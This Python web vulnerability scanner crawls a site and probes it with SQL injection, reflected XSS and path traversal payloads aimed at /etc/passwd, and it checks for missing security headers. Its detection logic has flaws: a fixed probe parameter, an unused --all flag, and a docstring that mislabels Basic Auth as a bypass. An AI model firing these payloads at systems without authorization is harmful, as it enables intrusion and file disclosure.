#!/usr/bin/env python3
"""
Web Vulnerability Scanner (Enhanced v2.0)
=========================
Tests web applications for common vulnerabilities:
- SQL Injection (error-based, blind time-based)
- Cross-Site Scripting (reflected XSS)
- Directory Traversal / Path Traversal
- Security Header Analysis
- Information Disclosure

NEW: Async httpx, Basic Auth bypass, rate limiting, concurrency control.

For authorized use only - only scan applications you own or have permission to test.
"""

import asyncio
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from html.parser import HTMLParser
from typing import List, Set, Tuple, Optional

try:
    import httpx
except ImportError:
    print("  [!] Install httpx: pip install httpx")
    sys.exit(1)


@dataclass
class Vulnerability:
    vuln_type: str
    severity: str  # "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""


@dataclass
class ScanReport:
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    forms_found: int = 0
    links_crawled: int = 0
    start_time: float = 0.0
    end_time: float = 0.0


# ─── SQL Injection Payloads ───────────────────────────────────────────
SQLI_ERROR_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "admin'--",
]

BLIND_SQLI_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
    "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",  # MySQL
    "'; SELECT pg_sleep(5)--",  # PostgreSQL
    "'; DECLARE @x VARCHAR(1);SET @x=(SELECT COUNT(*) FROM master..spt_values); WAITFOR DELAY '00:00:05'--",  # MSSQL alt
    "1; SELECT BENCHMARK(5000000,MD5(1))--",  # MySQL benchmark
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "syntax error",
    "unclosed quotation",
    "microsoft ole db",
    "odbc sql server driver",
    "postgresql",
    "ora-01756",
    "sqlite3",
    "warning: mysql",
    "valid mysql result",
    "pg_query",
    "you have an error in your sql",
    "supplied argument is not a valid",
    "mysql_num_rows",
    "division by zero",
    "microsoft sql native client error",
]

# ─── XSS Payloads ────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<svg/onload=alert("XSS")>',
    '"><img src=x onerror=alert(1)>',
]

# ─── Directory Traversal Payloads ─────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
]

TRAVERSAL_SIGNATURES = [
    "root:x:0:0",
    "root:*:0:0",  # /etc/passwd
    "[extensions]",  # win.ini
    "# localhost",
    "127.0.0.1",  # hosts file
]

# ─── Security Headers ────────────────────────────────────────────────
SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "HIGH",
        "description": "Missing HSTS header. Site vulnerable to protocol downgrade attacks.",
    },
    "Content-Security-Policy": {
        "severity": "MEDIUM",
        "description": "Missing CSP header. Site may be vulnerable to XSS and data injection.",
    },
    "X-Frame-Options": {
        "severity": "MEDIUM",
        "description": "Missing X-Frame-Options. Site may be vulnerable to clickjacking.",
    },
    "X-Content-Type-Options": {
        "severity": "LOW",
        "description": "Missing X-Content-Type-Options. Browser may MIME-sniff responses.",
    },
    "X-XSS-Protection": {
        "severity": "LOW",
        "description": "Missing X-XSS-Protection header (legacy but still useful).",
    },
    "Referrer-Policy": {
        "severity": "LOW",
        "description": "Missing Referrer-Policy. May leak sensitive URL info via referrer.",
    },
    "Permissions-Policy": {
        "severity": "LOW",
        "description": "Missing Permissions-Policy. Browser features not explicitly restricted.",
    },
}


class LinkExtractor(HTMLParser):
    """Extract links and forms from HTML."""

    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url
        self.links: Set[str] = set()
        self.forms: List[dict] = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "a" and "href" in attrs_dict:
            href = attrs_dict["href"]
            full_url = urllib.parse.urljoin(self.base_url, href)
            if full_url.startswith(("http://", "https://")):
                self.links.add(full_url)

        elif tag == "form":
            self._current_form = {
                "action": urllib.parse.urljoin(
                    self.base_url, attrs_dict.get("action", "")
                ),
                "method": attrs_dict.get("method", "GET").upper(),
                "inputs": [],
            }

        elif tag == "input" and self._current_form is not None:
            self._current_form["inputs"].append(
                {
                    "name": attrs_dict.get("name", ""),
                    "type": attrs_dict.get("type", "text"),
                    "value": attrs_dict.get("value", ""),
                }
            )

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form:
            self.forms.append(self._current_form)
            self._current_form = None


async def async_get(
    client: httpx.AsyncClient, url: str, **kwargs
) -> Optional[httpx.Response]:
    """Async GET with timeout."""
    try:
        resp = await client.get(url, timeout=10.0, **kwargs)
        return resp
    except (httpx.TimeoutException, httpx.RequestError):
        return None


async def test_sqli_async(
    client: httpx.AsyncClient,
    url: str,
    params: dict,
    payloads: List[str],
    delay: float,
    is_blind: bool = False,
) -> List[Vulnerability]:
    """Async SQLi test."""
    vulns = []
    tasks = []
    for payload in payloads:
        test_params = params.copy()
        test_params["test"] = payload  # Generic param for blind
        task = async_get(client, url, params=test_params)
        tasks.append((task, payload))
        await asyncio.sleep(delay)

    results = await asyncio.gather(*(t[0] for t in tasks), return_exceptions=True)
    for (resp, payload), result in zip(tasks, results):
        if isinstance(result, Exception) or result is None:
            continue
        body_lower = result.text.lower()
        for error in SQLI_ERRORS:
            if error in body_lower:
                vulns.append(
                    Vulnerability(
                        vuln_type="SQL Injection (Error)",
                        severity="CRITICAL",
                        url=url,
                        parameter="test",
                        payload=payload,
                        evidence=error,
                        description="Error-based SQLi detected",
                    )
                )
                break
        if is_blind:
            duration = result.elapsed.total_seconds()
            if duration > 4.0:  # Threshold for 5s delay
                vulns.append(
                    Vulnerability(
                        vuln_type="Blind SQLi (Time-based)",
                        severity="HIGH",
                        url=url,
                        parameter="test",
                        payload=payload,
                        evidence=f"Response delayed {duration:.1f}s",
                        description="Time-based blind SQLi confirmed",
                    )
                )

    return vulns


async def test_xss_async(
    client: httpx.AsyncClient, url: str, params: dict, delay: float
) -> List[Vulnerability]:
    vulns = []
    for payload in XSS_PAYLOADS[:3]:  # Limit
        test_params = params.copy()
        test_params["test"] = payload
        resp = await async_get(client, url, params=test_params)
        if resp and payload in resp.text:
            vulns.append(
                Vulnerability(
                    vuln_type="XSS (Reflected)",
                    severity="HIGH",
                    url=url,
                    payload=payload,
                    evidence="Reflected unescaped",
                )
            )
        await asyncio.sleep(delay)
    return vulns


async def test_traversal_async(
    client: httpx.AsyncClient, url: str, params: dict, delay: float
) -> List[Vulnerability]:
    vulns = []
    for payload in TRAVERSAL_PAYLOADS:
        test_params = params.copy()
        test_params["file"] = payload
        resp = await async_get(client, url, params=test_params)
        if resp:
            for sig in TRAVERSAL_SIGNATURES:
                if sig in resp.text:
                    vulns.append(
                        Vulnerability(
                            vuln_type="Directory Traversal",
                            severity="CRITICAL",
                            url=url,
                            payload=payload,
                            evidence=sig,
                        )
                    )
                    break
        await asyncio.sleep(delay)
    return vulns


async def check_headers_async(
    client: httpx.AsyncClient, url: str
) -> List[Vulnerability]:
    resp = await async_get(client, url)
    if not resp:
        return []
    vulns = []
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}
    for header, info in SECURITY_HEADERS.items():
        if header.lower() not in headers_lower:
            vulns.append(
                Vulnerability(
                    vuln_type="Missing Security Header",
                    severity=info["severity"],
                    url=url,
                    parameter=header,
                    description=info["description"],
                )
            )
    # Info disclosure
    if "server" in headers_lower and any(
        v in headers_lower["server"] for v in ["apache/", "nginx/"]
    ):
        vulns.append(
            Vulnerability(
                "Server Disclosure", "LOW", url, evidence=headers_lower["server"]
            )
        )
    return vulns


async def crawl_async(
    base_url: str, client: httpx.AsyncClient, max_depth: int = 2, delay: float = 0.0
) -> Tuple[Set[str], List[dict]]:
    """Async crawler."""
    visited = set()
    to_visit = [(base_url, 0)]
    all_forms = []
    domain = urllib.parse.urlparse(base_url).netloc

    while to_visit:
        current_url, depth = to_visit.pop(0)
        if current_url in visited or depth > max_depth:
            continue
        if urllib.parse.urlparse(current_url).netloc != domain:
            continue

        visited.add(current_url)
        resp = await async_get(client, current_url)
        if resp and "text/html" in resp.headers.get("content-type", ""):
            extractor = LinkExtractor(current_url)
            extractor.feed(resp.text)
            all_forms.extend(extractor.forms)
            for link in extractor.links:
                if link not in visited:
                    to_visit.append((link, depth + 1))
        await asyncio.sleep(delay)

    return visited, all_forms


async def run_tests_async(client: httpx.AsyncClient, urls: List[str], args):
    """Run all async tests."""
    report_vulns = []
    semaphore = asyncio.Semaphore(args.concurrency)

    async def test_url(url):
        async with semaphore:
            vulns = []
            if args.sqli:
                params = {"q": "1"}  # Dummy
                error_payloads = SQLI_ERROR_PAYLOADS
                if args.blind_sqli:
                    error_payloads += BLIND_SQLI_PAYLOADS
                vulns += await test_sqli_async(
                    client, url, params, error_payloads, args.delay, args.blind_sqli
                )
            if args.xss:
                vulns += await test_xss_async(client, url, {"q": "1"}, args.delay)
            if args.traversal:
                vulns += await test_traversal_async(
                    client, url, {"file": "test"}, args.delay
                )
            return vulns

    tasks = [test_url(url) for url in urls]
    results = await asyncio.gather(*tasks)
    for res in results:
        report_vulns.extend(res)
    if args.headers:
        report_vulns.extend(await check_headers_async(client, args.url))
    return report_vulns


SEVERITY_COLORS = {
    "CRITICAL": "🔴",
    "HIGH": "🟠",
    "MEDIUM": "🟡",
    "LOW": "🔵",
    "INFO": "⚪",
}


def print_report(report: ScanReport):
    """Print enhanced report."""
    report.end_time = time.time()
    print("  ╔═══════════════════════════════════════════════════════════════════╗")
    print("  ║  WEB VULNERABILITY SCAN RESULTS (Enhanced v2.0)                 ║")
    print("  ╠═══════════════════════════════════════════════════════════════════╣")
    print(f"  ║  Target:   {report.target[:55]}")
    print(f"  ║  Duration: {report.end_time - report.start_time:.2f}s")
    print(f"  ║  Crawled:  {report.links_crawled} | Forms: {report.forms_found}")
    print(f"  ║  Findings: {len(report.vulnerabilities)}")
    print("  ╠═══════════════════════════════════════════════════════════════════╣")

    if not report.vulnerabilities:
        print("  ║  ✅ No vulnerabilities found!")
    else:
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        report.vulnerabilities.sort(key=lambda v: severity_order.get(v.severity, 5))
        for v in report.vulnerabilities:
            icon = SEVERITY_COLORS.get(v.severity, "⚪")
            print(f"  ║  {icon} [{v.severity}] {v.vuln_type}")
            print(f"  ║     📍 {v.url[:60]}")
            if v.parameter:
                print(f"  ║     🔑 {v.parameter}")
            if v.payload:
                print(f"  ║     💣 {v.payload[:50]}...")
            if v.evidence:
                print(f"  ║     👁️  {v.evidence[:50]}...")
            print(f"  ║     💡 {v.description}")

    print("  ╚═══════════════════════════════════════════════════════════════════╝")


def run_web_scanner(args):
    """Main async web scanner."""
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    print(f"  [*] Async Web Scanner v2.0 | Target: {url}")
    print(
        f"  [*] Concurrency: {args.concurrency} | Delay: {args.delay}s | Blind SQLi: {args.blind_sqli}"
    )
    if args.auth:
        print(f"  [*] Auth: {args.auth}")

    report = ScanReport(target=url, start_time=time.time())

    async def main_scan():
        limits = httpx.Limits(
            max_keepalive_connections=5, max_connections=args.concurrency
        )
        headers = {"User-Agent": "ShadowToolkit/2.0 (Async Security Scanner)"}
        auth = None
        if args.auth:
            user, passw = args.auth.split(":", 1)
            auth = httpx.BasicAuth(user, passw)

        async with httpx.AsyncClient(
            limits=limits, headers=headers, auth=auth, verify=False
        ) as client:
            print(f"  [*] Async crawling (depth={args.depth})...")
            urls, forms = await crawl_async(url, client, args.depth, args.delay)
            report.links_crawled = len(urls)
            report.forms_found = len(forms)
            print(f"  [*] Found {len(urls)} URLs, {len(forms)} forms")

            print("  [*] Running async tests...")
            vulns = await run_tests_async(client, list(urls), args)
            report.vulnerabilities = vulns

    asyncio.run(main_scan())
    print_report(report)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    # Standalone args match CLI
    parser.add_argument("url")
    parser.add_argument("--sqli", action="store_true")
    parser.add_argument("--xss", action="store_true")
    parser.add_argument("--traversal", action="store_true")
    parser.add_argument("--headers", action="store_true")
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--depth", type=int, default=2)
    parser.add_argument("--auth")
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--concurrency", type=int, default=10)
    parser.add_argument("--blind-sqli", action="store_true")
    args = parser.parse_args()
    run_web_scanner(args)
